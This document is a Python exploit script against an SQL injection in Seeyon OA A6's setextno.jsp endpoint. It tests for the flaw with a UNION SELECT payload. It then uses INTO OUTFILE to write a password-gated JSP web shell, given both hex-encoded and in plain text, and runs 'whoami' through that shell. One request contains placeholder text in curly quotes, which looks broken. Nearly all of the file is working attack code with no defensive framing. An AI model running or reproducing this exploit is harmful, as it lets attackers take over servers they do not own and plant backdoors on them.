import time
import argparse
import requests
import multiprocessing
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#存在致远OA A6 setextno.jsp SQL注入

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def exp_check(target_url):
    vuln_url = target_url + "/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999)+union+all+select+1,2,(md5(1)),4#"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    print(now_time() + " [INFO]     正在检测致远OA A6 setextno.jsp SQL注入Getshell漏洞")
    print(now_time() + " [INFO]     正在请求 {}".format(vuln_url))
    try:
        response = requests.get(vuln_url, headers=headers, verify=False, timeout=10)
        if response.status_code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in response.text:
            return 1
        else:
            return 2
    except:
        return 3


def exp_others(url,path1):
    filename1 = "/0.jsp"
    payload="3c25206966282230222e657175616c7328726571756573742e676574506172616d657465722822707764222929297b206a6176612e696f2e496e70757453747265616d20696e203d2052756e74696d652e67657452756e74696d6528292e6578656328726571756573742e676574506172616d657465722822692229292e676574496e70757453747265616d28293b20696e742061203d202d313b20627974655b5d2062203d206e657720627974655b323034385d3b206f75742e7072696e7428223c7072653e22293b207768696c652828613d696e2e7265616428622929213d2d31297b206f75742e7072696e746c6e286e657720537472696e67286229293b207d206f75742e7072696e7428223c2f7072653e22293b207d20253e"
    payload1='''<% if("0".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print("</pre>"); } %>'''
    target_url = url+"/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999)+union+select+1,'{0}',3,4+into+outfile+'{1}{2}'".format(payload,path1,filename1)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    response = requests.get(url=target_url, headers=headers, verify=False, timeout=10)
    target_url1 = url+"/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(‘hextext’)%20%20into%20outfile%20’webpath+0.jsp’"
    target_url2 = url+"/yyoa/0.jsp?pwd=0&i=whoami"
    try:
        response1 = requests.get(url=target_url1,headers=headers,verify=False,timeout=10)
        if "java.lang" in response1.text:
            response3 = requests.get(url=target_url2,headers=headers,verify=False,timeout=10)
            if response3.status_code == 200:
                return "{}/yyoa/0.jsp?pwd=0&i=whoami".format(url)
    except:
        return 3